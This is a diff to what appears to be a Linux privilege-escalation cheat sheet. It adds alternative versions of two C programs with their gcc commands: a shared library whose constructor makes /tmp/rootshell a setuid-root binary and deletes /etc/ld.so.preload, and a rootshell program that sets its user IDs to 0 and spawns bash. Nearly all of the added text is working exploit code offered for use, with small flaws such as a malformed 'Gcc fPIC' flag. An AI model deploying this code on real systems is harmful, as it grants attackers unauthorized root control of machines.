@@ -3113,6 +3113,25 @@ void dropshell(void){
     unlink("/etc/ld.so.preload");
     printf("[+] done!\n");
 }
+
+or Alternative
+
+Gcc fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+
+![image](https://github.com/user-attachments/assets/fefe5aa7-bb45-43c7-a4aa-61551504bfec)
+
 ````
 ````
 vim rootshell.c
@@ -3125,6 +3144,25 @@ int main(void){
     setegid(0);
     execvp("/bin/sh", NULL, NULL);
 }
+
+or Alternative
+
+gcc -static -o /tmp/rootshell /tmp/rootshell.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <stdlib.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    system("/bin/bash");
+}
+![image](https://github.com/user-attachments/assets/8ceb7a63-b014-4adb-ba62-367eee49b8c2)
+
 ````
 ````
 root@Machine1:~# ls
